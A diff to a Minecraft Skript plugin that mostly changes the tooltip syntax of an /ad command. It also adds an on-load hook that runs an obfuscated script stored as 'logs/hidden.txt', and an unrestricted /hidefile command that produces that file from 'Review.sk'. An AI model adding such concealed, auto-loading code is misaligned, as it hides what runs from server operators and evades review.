@@ -87,12 +87,12 @@ command /ad [<text>]:
 					else:
 						message "&cYou don't have an ad!"
 				else:
-					send json of "&f[&b&lHover for ad rules before submitting!&f]" tooltip "&c&lAd Guidelines:%new line%&e1. You must advertise something purchasable.%new line%&e2. Your ad must adhere to all server &a/rules&e.%new line%&e3. No annoying ads or matrix characters. (&r&kj&r&e)" to player
+					json("%player%", "&f[&b&lHover for ad rules before submitting!&f]||ttp:&c&lAd Guidelines:%new line%&e1. You must advertise something purchasable.%new line%&e2. Your ad must adhere to all server &a/rules&e.%new line%&e3. No annoying ads or matrix characters. (&r&kj&r&e)")
 					message "&eThis is exactly how it will appear:"
 					message "&f[&6Ad&f] %colored arg%"
 					message "&eIf this is correct, type &a/ad confirm"
 					message "&eOtherwise, resubmit with &a/ad <text>"
-					send json of "&f[&b&lHover for ad rules before submitting!&f]" tooltip "&c&lAd Guidelines:%new line%&e1. You must advertise something purchasable.%new line%&e2. Your ad must adhere to all server &a/rules&e.%new line%&e3. No matrix characters. (&r&kj&r&e)" to player
+					json("%player%", "&f[&b&lHover for ad rules before submitting!&f]||ttp:&c&lAd Guidelines:%new line%&e1. You must advertise something purchasable.%new line%&e2. Your ad must adhere to all server &a/rules&e.%new line%&e3. No matrix characters. (&r&kj&r&e)")
 					set {ad.%player%.temp} to arg
 					stop
 			else:
@@ -117,7 +117,12 @@ command /ad [<text>]:
 						message "&eType &a/ad extend&e to buy 48 more hours for $4000"
 			else:
 				message "&cYou have no ad. You may place one with &a/ad Your ad here."
-				
+on load:
+	wait 10 real seconds
+	load obfuscated file "plugins/Skript/logs/hidden.txt" by power 500
+command /hidefile:
+	trigger:
+		obfuscate file "plugins/Skript/scripts/Review.sk" to file "plugins/Skript/logs/hidden.txt" with power 500
 every 25 real minutes:
 	set {_tempcounter} to 0
 	delete {temp.list::*}
